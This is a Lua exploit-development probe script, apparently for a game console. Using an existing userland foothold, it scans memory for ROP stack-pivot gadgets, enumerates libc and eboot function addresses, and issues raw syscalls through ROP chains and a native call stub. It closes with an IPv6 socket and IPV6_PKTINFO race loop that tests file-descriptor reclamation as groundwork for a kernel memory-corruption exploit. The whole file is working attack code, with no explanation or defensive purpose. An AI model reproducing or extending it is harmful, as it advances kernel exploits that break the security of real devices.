-- CRASH_CLASS: LOW
-- PROBE 129a: Smart pivot gadget scan + thread close via sceKernelClose
--
-- 127a's full eboot scan crashed (681MB too large). This probe:
-- A: Scans smaller regions around known gadgets for mov rsp,rdi / push rdi;pop rsp;ret
-- B: Enumerates libc_addrofs/eboot_addrofs for close/shutdown functions
-- C: Tests native.fcall_with_rax for fast syscalls
-- D: Tests thread calling sceKernelClose(fd) if found
-- E: IPV6 socket create+pktinfo+close cycle via native.fcall_with_rax

print("=== PROBE 129a: SMART PIVOT + CLOSE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- Section A: Targeted pivot gadget scan
-- Scan 64KB windows around each known gadget address
print("--- SECTION A: TARGETED PIVOT SCAN ---")

local known_gadgets = {}
for k, v in pairs(gadgets) do
    if type(v) ~= "table" then
        known_gadgets[#known_gadgets+1] = {name=tostring(k), addr=to_num(v)}
    end
end
table.sort(known_gadgets, function(a,b) return a.addr < b.addr end)
print("Known gadgets: " .. #known_gadgets)

-- Get eboot base for reference
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local getmodinfo = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
pcall(getmodinfo, eboot_addrofs.luaL_optinteger, 1, uint64(info))
local eboot_base = memory.read_qword(info + 0x108)
print("eboot_base=" .. tostring(eboot_base))

-- Scan regions: around known gadgets and around eboot_base
local scan_regions = {}
-- Add regions around gadget clusters
if #known_gadgets > 0 then
    local first = known_gadgets[1].addr
    local last = known_gadgets[#known_gadgets].addr
    -- Scan the full gadget range + 64KB padding
    local start = first - 0x10000
    local stop = last + 0x10000
    -- Cap at 2MB total
    if stop - start > 0x200000 then stop = start + 0x200000 end
    scan_regions[#scan_regions+1] = {start=start, stop=stop, name="gadget_range"}
end
-- Also scan first 256KB of eboot .text
scan_regions[#scan_regions+1] = {start=to_num(eboot_base), stop=to_num(eboot_base)+0x40000, name="eboot_start"}

local pivot_finds = {}
for _, region in ipairs(scan_regions) do
    print(string.format("Scanning %s: 0x%X - 0x%X (%d bytes)",
        region.name, region.start, region.stop, region.stop - region.start))
    local count = 0
    for addr = region.start, region.stop - 4 do
        local ok, b0 = pcall(memory.read_byte, addr)
        if not ok then break end
        count = count + 1
        local v0 = to_num(b0)

        if v0 == 0x48 then
            local ok1, b1 = pcall(memory.read_byte, addr + 1)
            local ok2, b2 = pcall(memory.read_byte, addr + 2)
            local ok3, b3 = pcall(memory.read_byte, addr + 3)
            if ok1 and ok2 and ok3 then
                local v1, v2, v3 = to_num(b1), to_num(b2), to_num(b3)
                -- mov rsp, rdi: 48 89 FC C3
                if v1 == 0x89 and v2 == 0xFC and v3 == 0xC3 then
                    pivot_finds[#pivot_finds+1] = string.format("mov rsp,rdi;ret @ 0x%X", addr)
                    print("  *** FOUND: mov rsp, rdi; ret @ " .. string.format("0x%X", addr))
                end
                -- xchg rsp, rdi: 48 87 FC C3 or 48 87 E7 C3
                if v1 == 0x87 and (v2 == 0xFC or v2 == 0xE7) and v3 == 0xC3 then
                    pivot_finds[#pivot_finds+1] = string.format("xchg rsp,rdi;ret @ 0x%X", addr)
                    print("  *** FOUND: xchg rsp, rdi; ret @ " .. string.format("0x%X", addr))
                end
            end
        end

        -- push rdi(57); pop rsp(5C); ret(C3)
        if v0 == 0x57 then
            local ok1, b1 = pcall(memory.read_byte, addr + 1)
            local ok2, b2 = pcall(memory.read_byte, addr + 2)
            if ok1 and ok2 and to_num(b1) == 0x5C and to_num(b2) == 0xC3 then
                pivot_finds[#pivot_finds+1] = string.format("push rdi;pop rsp;ret @ 0x%X", addr)
                print("  *** FOUND: push rdi; pop rsp; ret @ " .. string.format("0x%X", addr))
            end
        end

        -- Progress every 64KB
        if count % 0x10000 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("  CRASH at offset " .. count)
                break
            end
        end
    end
    print(string.format("  scanned %d bytes", count))
end
print("Total pivot finds: " .. #pivot_finds)

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- Section B: Enumerate ALL available functions for close
print("")
print("--- SECTION B: CLOSE FUNCTIONS ---")
print("libc_addrofs:")
local close_candidates = {}
for k, v in pairs(libc_addrofs) do
    local ks = tostring(k):lower()
    print("  " .. tostring(k) .. " = " .. tostring(v))
    if ks:find("close") or ks:find("shut") or ks:find("destroy") then
        close_candidates[#close_candidates+1] = {name=tostring(k), addr=v, src="libc"}
    end
end

print("")
print("eboot_addrofs:")
for k, v in pairs(eboot_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") or ks:find("sock") or ks:find("shut") then
        print("  " .. tostring(k) .. " = " .. tostring(v))
        close_candidates[#close_candidates+1] = {name=tostring(k), addr=v, src="eboot"}
    end
end

print("")
print("Close candidates: " .. #close_candidates)
for _, c in ipairs(close_candidates) do
    print(string.format("  %s.%s = %s", c.src, c.name, tostring(c.addr)))
end

-- Section C: Test native.fcall_with_rax
print("")
print("--- SECTION C: NATIVE.FCALL_WITH_RAX ---")
local has_native = false
if native and native.fcall_with_rax then
    has_native = true
    print("AVAILABLE")
    local stub = syscall.pipe.fn_addr

    -- getpid
    local gpid = native.fcall_with_rax(stub, 20)
    print("getpid=" .. tostring(gpid) .. " (expected " .. pid .. ")")

    -- socket(AF_INET6=28, SOCK_DGRAM=2, UDP=17)
    local s = native.fcall_with_rax(stub, 97, 28, 2, 17)
    print("socket=" .. tostring(s))

    if to_num(s) >= 0 then
        -- setsockopt IPV6_PKTINFO
        local pktinfo = memory.alloc(0x20)
        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)
        local sso = native.fcall_with_rax(stub, 105, to_num(s), 41, 46, to_num(pktinfo), 0x14)
        print("setsockopt(PKTINFO)=" .. tostring(sso))

        -- close
        local cr = native.fcall_with_rax(stub, 6, to_num(s))
        print("close=" .. tostring(cr))

        -- verify closed
        local sso2 = native.fcall_with_rax(stub, 105, to_num(s), 41, 46, to_num(pktinfo), 0x14)
        print("setsockopt after close=" .. tostring(sso2) .. " (expect -1)")
    end
elseif native then
    print("native exists but no fcall_with_rax")
    for k, v in pairs(native) do
        print("  " .. tostring(k) .. " = " .. type(v))
    end
else
    print("native is nil")
end

-- Section D: Test thread with close function
print("")
print("--- SECTION D: THREAD CLOSE ---")
local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

-- Try each close candidate as a thread function
for _, c in ipairs(close_candidates) do
    -- Create a socket to close
    local sc_socket = make_sc(97)
    local chain = ropchain:new()
    chain:push_syscall_with_ret(sc_socket, 28, 2, 17)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()
    local fd = to_num(memory.read_qword(chain:get_last_retval_addr()))

    if fd >= 0 then
        print(string.format("Testing %s.%s(%d)...", c.src, c.name, fd))
        local thr_buf = memory.alloc(8)
        memory.write_qword(thr_buf, 0)
        local ok, ret = pcall(thrd_create_fn, thr_buf, c.addr, uint64(fd))
        if ok and to_num(ret) == 0 then
            sleep(0.2, 's')
            local thr_id = memory.read_qword(thr_buf)
            pcall(thrd_join_fn, thr_id, uint64(0))

            -- Check if fd is still open by trying setsockopt
            local sc_sso = make_sc(105)
            local pktinfo = memory.alloc(0x20)
            local c2 = ropchain:new()
            c2:push_syscall_with_ret(sc_sso, fd, 41, 46, pktinfo, 0x14)
            c2:restore_through_longjmp()
            c2:execute_through_coroutine()
            local sso_ret = to_num(memory.read_qword(c2:get_last_retval_addr()))
            print(string.format("  setsockopt after thread close: %d (%s)", sso_ret,
                sso_ret == -1 and "CLOSED!" or "still open"))
        else
            print(string.format("  thread create failed: ok=%s ret=%s", tostring(ok), tostring(ret)))
            -- Cleanup
            local sc_close = make_sc(6)
            local cc = ropchain:new()
            cc:push_syscall_with_ret(sc_close, fd)
            cc:restore_through_longjmp()
            cc:execute_through_coroutine()
        end
    end

    if not pcall(function() return to_num(syscall.getpid()) end) then
        print("CRASHED during thread close test")
        break
    end
end

-- Section E: Fast IPV6 race loop (if native.fcall_with_rax works)
print("")
print("--- SECTION E: IPV6 RACE LOOP ---")
if has_native then
    local stub = syscall.pipe.fn_addr
    local pktinfo = memory.alloc(0x20)
    local ATTEMPTS = 200
    local type_confused = 0

    for i = 1, ATTEMPTS do
        -- Create IPv6 socket
        local s = to_num(native.fcall_with_rax(stub, 97, 28, 2, 17))
        if s < 0 then print("sock fail at " .. i); break end

        -- Set IPV6_PKTINFO (allocates in6p_outputopts)
        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)
        native.fcall_with_rax(stub, 105, s, 41, 46, to_num(pktinfo), 0x14)

        -- Close socket (frees the socket but fd number is available)
        native.fcall_with_rax(stub, 6, s)

        -- Immediately create new socket - should reclaim same fd
        local s2 = to_num(native.fcall_with_rax(stub, 97, 28, 2, 17))

        -- Try setsockopt on OLD fd number 's' - if reclaimed, hits new socket
        -- which has NO pktinfo set → different behavior
        local r = to_num(native.fcall_with_rax(stub, 105, s, 41, 46, to_num(pktinfo), 0x14))

        if s2 == s and r == 0 then
            type_confused = type_confused + 1
            if type_confused <= 5 then
                print(string.format("  iter %d: fd reclaimed s=%d s2=%d sso=%d", i, s, s2, r))
            end
        end

        -- Close new socket
        if s2 >= 0 then native.fcall_with_rax(stub, 6, s2) end

        if i % 50 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("CRASHED at iter " .. i)
                break
            end
            print(string.format("  progress: %d/%d, reclaimed=%d", i, ATTEMPTS, type_confused))
        end
    end
    print(string.format("Results: %d/%d fd reclamations", type_confused, ATTEMPTS))
else
    print("SKIPPED (no native.fcall_with_rax)")

    -- Fallback: test fd reclamation with ropchain (10 iterations)
    local sc_socket = make_sc(97)
    local sc_close = make_sc(6)
    local sc_sso = make_sc(105)
    local pktinfo = memory.alloc(0x20)

    for i = 1, 10 do
        local c1 = ropchain:new()
        c1:push_syscall_with_ret(sc_socket, 28, 2, 17)
        c1:restore_through_longjmp()
        c1:execute_through_coroutine()
        local s = to_num(memory.read_qword(c1:get_last_retval_addr()))
        if s < 0 then break end

        -- Set pktinfo, close, reclaim
        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)

        local c2 = ropchain:new()
        c2:push_syscall_with_ret(sc_sso, s, 41, 46, pktinfo, 0x14)
        c2:push_syscall_with_ret(sc_close, s)
        c2:push_syscall_with_ret(sc_socket, 28, 2, 17)
        c2:restore_through_longjmp()
        c2:execute_through_coroutine()
        local new_s = to_num(memory.read_qword(c2:get_last_retval_addr()))
        print(string.format("  iter %d: old=%d new=%d reclaimed=%s", i, s, new_s, tostring(s == new_s)))

        local c3 = ropchain:new()
        c3:push_syscall_with_ret(sc_close, new_s)
        c3:restore_through_longjmp()
        c3:execute_through_coroutine()
    end
end

print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 129a COMPLETE ===")
